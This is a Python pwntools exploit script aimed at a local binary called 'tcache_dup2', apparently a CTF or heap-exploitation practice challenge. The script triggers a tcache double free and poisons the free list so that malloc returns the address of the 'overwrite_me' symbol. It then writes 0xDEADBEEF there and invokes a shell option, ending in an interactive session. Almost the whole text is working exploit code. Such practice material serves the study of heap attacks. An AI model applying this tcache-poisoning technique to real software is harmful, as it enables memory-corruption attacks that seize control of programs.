#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./tcache_dup2")
elf = ELF("./tcache_dup2")
overwrite_me = elf.symbols['overwrite_me']

def malloc(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Data: ", str(data))

def free(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

def shell():
    p.sendlineafter("> ", '3')

p.sendafter("Name: ", 'koharin')
gdb.attach(p)
malloc('A'*8)
#Double Free
free(0)
free(0)
malloc(p64(overwrite_me))
#malloc on free chunk
malloc('A'*8)
# malloc in overwrite_me
malloc(p64(0xDEADBEEF))
shell()

p.interactive()
